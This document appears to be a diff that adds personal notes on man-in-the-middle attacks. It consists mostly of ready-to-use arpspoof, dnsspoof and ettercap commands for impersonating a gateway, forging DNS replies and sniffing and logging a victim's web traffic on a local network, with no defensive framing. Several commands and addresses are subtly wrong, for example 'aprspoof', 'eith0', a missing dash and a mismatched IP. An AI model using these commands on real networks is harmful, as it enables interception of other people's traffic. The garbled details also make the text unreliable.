@@ -1,0 +1,68 @@
+=== APR Cache Poisoning ===
+
+An attack that lets you pretend being another host on the network, receiving
+all the packats addressed to the target.
+You can then re-transmit those back to the original destination.
+
+1) Enable IP forwarding
+
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+== arpspoof ==
+
+The command below tells 192.168.1.1 that we ARE 192.168.1.20:
+
+	aprspoof -i eth0 -t 192.168.1.10 [-r] 192.168.1.20
+
+	Add -r to do the inverse direction automatically!
+
+Impersonate the default gw for host 192.168.68.120:
+
+	arpspoof -i wlan0 t 192.168.68.120 -r 192.168.68.1
+
+
+NOTE:
+	apt install dsniff
+
+
+== dnsspoof ==
+
+DNS Spoofing
+
+[The manual don't seems to be working much, still]
+
+	dnsspoof -i eith0 -f hosts.txt
+
+	cat hosts.txt:
+
+		1.2.3.4 	the.name
+		1.2.3.5		another.name
+
+[it doesn't work on the fast netwok as non-killed original reply arrives before the spoofed one!]
+
+
+== ettercap ==
+
+	Multi-purpose spoofing ARP cache poisoning ssl spoofing etc utility
+
+* First - ensure that the config file
+
+	/etc/ettercap/etter.conf
+
+has un-commented lines for:
+
+	redir_command_(on|off)
+	redir6_command_(on|off)
+
+Spoof the traffic of 192.168.68.113 (default gw is 192.168.68.1):
+
+		ettercap -T:wlan0 -M arp:remote /192.168.68.1//  /192.168.86.113//
+
+		[performs the cache poisoning and sniffs everything]
+
+Same as above, but focus on ports 80,443 [works better] and log binary:
+
+		ettercap -T:wlan0 -L /tmp/log -M arp:remote /192.168.68.1// /192.168.68.113//80,443
+
+
+
